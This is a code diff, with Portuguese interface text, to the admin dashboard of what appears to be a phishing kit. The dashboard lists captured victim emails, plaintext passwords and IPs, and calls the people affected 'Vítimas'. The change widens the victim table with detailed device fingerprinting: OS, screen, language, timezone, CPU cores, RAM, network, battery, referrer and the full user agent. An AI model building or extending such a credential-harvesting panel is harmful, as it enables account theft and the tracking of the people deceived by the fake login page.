@@ -18,7 +18,7 @@
         }
         
         .container {
-            max-width: 1400px;
+            max-width: 1600px;
             margin: 0 auto;
         }
         
@@ -72,34 +72,42 @@
             margin-bottom: 15px;
         }
         
-        table {
-            width: 100%;
+        .table-wrapper {
+            overflow-x: auto;
             background: #fff;
-            border-collapse: collapse;
             border: 1px solid #dadce0;
             border-radius: 8px;
-            overflow: hidden;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 13px;
         }
         
         th {
             background: #f8f9fa;
-            padding: 12px;
+            padding: 10px 8px;
             text-align: left;
-            font-weight: 500;
+            font-weight: 600;
             color: #5f6368;
             border-bottom: 1px solid #dadce0;
-            font-size: 14px;
+            white-space: nowrap;
         }
         
         td {
-            padding: 12px;
-            border-bottom: 1px solid #dadce0;
-            font-size: 14px;
+            padding: 10px 8px;
+            border-bottom: 1px solid #f0f0f0;
             color: #202124;
+            vertical-align: top;
         }
         
         tr:last-child td {
             border-bottom: none;
+        }
+        
+        tr:hover {
+            background: #fafafa;
         }
         
         .email {
@@ -116,15 +124,18 @@
         .ip {
             font-family: 'Courier New', monospace;
             color: #188038;
+            font-weight: 600;
         }
         
         .timestamp {
             white-space: nowrap;
+            font-size: 12px;
         }
         
         .device-info {
             font-size: 12px;
             color: #5f6368;
+            line-height: 1.4;
         }
         
         .no-data {
@@ -133,17 +144,45 @@
             color: #5f6368;
         }
         
+        .expand-btn {
+            background: #1a73e8;
+            color: #fff;
+            border: none;
+            padding: 4px 10px;
+            border-radius: 4px;
+            font-size: 11px;
+            cursor: pointer;
+        }
+        
+        .expand-btn:hover {
+            background: #1557b0;
+        }
+        
+        .details-row {
+            background: #f8f9fa;
+        }
+        
+        .details-row td {
+            padding: 12px 16px;
+        }
+        
+        .details-content {
+            font-size: 12px;
+            color: #3c4043;
+            line-height: 1.6;
+        }
+        
+        .details-content strong {
+            color: #202124;
+        }
+        
         @media (max-width: 768px) {
             table {
-                font-size: 12px;
+                font-size: 11px;
             }
             
             th, td {
-                padding: 8px;
-            }
-            
-            .stats {
-                grid-template-columns: 1fr;
+                padding: 6px 4px;
             }
         }
     </style>
@@ -164,7 +203,7 @@
             </div>
             <div class="stat-card">
                 <div class="stat-number" id="uniqueIps">0</div>
-                <div class="stat-label">Vítimas Únicas (IPs)</div>
+                <div class="stat-label">IPs Únicos (Vítimas)</div>
             </div>
             <div class="stat-card">
                 <div class="stat-number" id="uniqueEmails">0</div>
@@ -180,6 +219,7 @@
             <a href="/" style="color: #1a73e8;">← Voltar para Login</a>
         </div>
         
+        <div class="table-wrapper">
         <table>
             <thead>
                 <tr>
@@ -188,16 +228,21 @@
                     <th>🔑 Senha</th>
                     <th>🌍 IP</th>
                     <th>📱 Dispositivo</th>
-                    <th>🌐 Navegador</th>
+                    <th>💻 OS / Browser</th>
+                    <th>📐 Tela / Idioma</th>
+                    <th>🔧 CPU / RAM</th>
+                    <th>📡 Rede</th>
                     <th>🕐 Timestamp</th>
+                    <th>🔍</th>
                 </tr>
             </thead>
             <tbody id="logsTable">
                 <tr>
-                    <td colspan="7" class="no-data">Carregando dados...</td>
+                    <td colspan="11" class="no-data">Carregando dados...</td>
                 </tr>
             </tbody>
         </table>
+        </div>
     </div>
     
     <script>
@@ -218,6 +263,20 @@
             }
         }
         
+        function getDeviceLabel(d) {
+            if (d.mobile) return '📱 Mobile';
+            return '💻 Desktop';
+        }
+        
+        function getMobileType(d) {
+            const ua = (d.user_agent || '').toLowerCase();
+            if (ua.includes('iphone')) return 'iPhone';
+            if (ua.includes('ipad')) return 'iPad';
+            if (ua.includes('android')) return 'Android';
+            if (ua.includes('windows phone')) return 'Windows Phone';
+            return null;
+        }
+        
         async function fetchLogs() {
             try {
                 const response = await fetch(`${API_URL}/logs`);
@@ -226,32 +285,64 @@
                 const tbody = document.getElementById('logsTable');
                 
                 if (!data.logs || data.logs.length === 0) {
-                    tbody.innerHTML = '<tr><td colspan="7" class="no-data">Nenhuma captura encontrada ainda. Teste o login!</td></tr>';
+                    tbody.innerHTML = '<tr><td colspan="11" class="no-data">Nenhuma captura encontrada ainda. Teste o login!</td></tr>';
                     return;
                 }
                 
                 tbody.innerHTML = data.logs.map(log => {
-                    let deviceInfo = '';
-                    let osInfo = '';
-                    let browserInfo = '';
+                    let d = {};
                     try {
-                        const device = JSON.parse(log.device_info || '{}');
-                        deviceInfo = device.mobile ? '📱 Mobile' : '💻 Desktop';
-                        osInfo = device.os || 'unknown';
-                        browserInfo = device.browser || 'unknown';
-                    } catch {
-                        deviceInfo = 'Desconhecido';
+                        d = JSON.parse(log.device_info || '{}');
+                    } catch (e) {
+                        d = {};
                     }
+                    
+                    const deviceType = getDeviceLabel(d);
+                    const mobileType = getMobileType(d);
+                    const osInfo = d.os || 'unknown';
+                    const browserInfo = d.browser || 'unknown';
+                    const screen = d.screen || '?';
+                    const lang = d.language || '?';
+                    const cores = d.cores || '?';
+                    const memory = d.memory ? d.memory + 'GB' : '?';
+                    const network = d.network || '?';
+                    const timezone = d.timezone || '?';
+                    const platform = d.platform || '?';
+                    
+                    let battery = '?';
+                    if (d.battery === true) battery = '🔋 Sim';
+                    else if (d.battery === false) battery = '❌ Não';
                     
                     return `
                         <tr>
-                            <td>#${log.id}</td>
+                            <td><strong>#${log.id}</strong></td>
                             <td class="email">${escapeHtml(log.email)}</td>
                             <td class="password">${escapeHtml(log.password)}</td>
                             <td class="ip">${escapeHtml(log.ip)}</td>
-                            <td class="device-info">${deviceInfo} (${escapeHtml(osInfo)})</td>
-                            <td class="device-info">${escapeHtml(browserInfo)}</td>
+                            <td class="device-info">${deviceType}${mobileType ? ' (' + mobileType + ')' : ''}</td>
+                            <td class="device-info">${escapeHtml(osInfo)}<br>${escapeHtml(browserInfo)}<br><small>${escapeHtml(platform)}</small></td>
+                            <td class="device-info">${escapeHtml(screen)}<br>${escapeHtml(lang)}<br><small>${escapeHtml(timezone)}</small></td>
+                            <td class="device-info">${cores} cores<br>${memory} RAM</td>
+                            <td class="device-info">${escapeHtml(network)}<br>${battery}</td>
                             <td class="timestamp">${formatDate(log.timestamp)}</td>
+                            <td><button class="expand-btn" onclick="toggleDetails(${log.id})">Ver</button></td>
+                        </tr>
+                        <tr id="details-${log.id}" class="details-row" style="display:none;">
+                            <td colspan="11">
+                                <div class="details-content">
+                                    <strong>🔍 Detalhes Completos:</strong><br>
+                                    <strong>User-Agent:</strong> ${escapeHtml(log.user_agent || 'N/A')}<br>
+                                    <strong>Plataforma:</strong> ${escapeHtml(platform)}<br>
+                                    <strong>CPU Cores:</strong> ${cores} | <strong>RAM:</strong> ${memory}<br>
+                                    <strong>Cookies:</strong> ${d.cookies ? '✅ Habilitados' : '❌ Desabilitados'} | 
+                                    <strong>Online:</strong> ${d.online ? '✅ Sim' : '❌ Não'}<br>
+                                    <strong>Do Not Track:</strong> ${escapeHtml(String(d.doNotTrack || 'N/A'))}<br>
+                                    <strong>Referrer:</strong> ${escapeHtml(d.referrer || 'Direct')}<br>
+                                    <strong>URL:</strong> ${escapeHtml(d.url || 'N/A')}<br>
+                                    <strong>Client IP:</strong> ${escapeHtml(d.client_provided ? 'Fornecido pelo cliente' : 'Headers do servidor')}<br>
+                                    <strong>Device Info Raw:</strong> <pre style="background:#fff;padding:8px;border-radius:4px;overflow:auto;font-size:11px;">${escapeHtml(JSON.stringify(d, null, 2))}</pre>
+                                </div>
+                            </td>
                         </tr>
                     `;
                 }).join('');
@@ -260,13 +351,21 @@
                 document.getElementById('lastUpdate').textContent = now.toLocaleString('pt-BR');
             } catch (err) {
                 console.error('Erro ao buscar logs:', err);
-                document.getElementById('logsTable').innerHTML = '<tr><td colspan="7" class="no-data">Erro ao carregar dados</td></tr>';
+                document.getElementById('logsTable').innerHTML = '<tr><td colspan="11" class="no-data">Erro ao carregar dados</td></tr>';
+            }
+        }
+        
+        function toggleDetails(id) {
+            const row = document.getElementById('details-' + id);
+            if (row) {
+                row.style.display = row.style.display === 'none' ? 'table-row' : 'none';
             }
         }
         
         function escapeHtml(text) {
+            if (text === null || text === undefined) return '';
             const div = document.createElement('div');
-            div.textContent = text;
+            div.textContent = String(text);
             return div.innerHTML;
         }
         
